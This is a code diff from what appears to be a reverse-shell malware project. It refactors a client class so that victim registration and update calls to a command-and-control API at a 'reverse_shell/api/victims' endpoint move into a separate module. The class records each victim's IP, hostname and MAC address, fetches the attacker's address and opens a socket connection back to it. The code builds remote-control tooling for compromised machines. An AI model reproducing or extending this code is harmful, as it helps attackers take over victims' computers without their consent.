@@ -1,3 +1,4 @@
+from api import create_victim, update_victim
 import subprocess
 import requests
 import socket
@@ -23,20 +24,7 @@ class Client(object):
         # using regex expression
         return ':'.join(re.findall('..', '%012x' % uuid.getnode()))
 
-    def create_victim(self):
-        data = {
-            'ip': self.host_ip,
-            'port': self.port,
-            'computer_name': self.host_name,
-            'mac_address': self.mac_address,
-            'logged_in': True,
-        }
-        response = requests.post('http://127.0.0.1:8000/reverse_shell/api/victims/', data=data)
-        return response
 
-    def update_victim(self, data):
-        response = requests.patch(f'http://127.0.0.1:8000/reverse_shell/api/victims/{self.mac_address}/', data=data)
-        return response
 
     def connect_to_attacker(self):
         response = requests.get(
@@ -48,12 +36,12 @@ class Client(object):
         attacker_ip = attacker['ip']
         attacker_port = attacker['port']
         self.connect_socket(attacker_ip, attacker_port)
-        self.update_victim(data={'port': self.client.getsockname()[1]})
+        update_victim(self.mac_address, data={'port': self.client.getsockname()[1]})
 
     def connect_to_web_server(self):
-        response = self.create_victim()
+        response = create_victim(self.host_ip, self.port, self.host_name, self.mac_address)
         if response.status_code == 400:
-            self.update_victim(data={'logged_in': True})
+            update_victim(self.mac_address, data={'logged_in': True})
         self.connect_to_attacker()
 
     def connect_socket(self, ip, port):
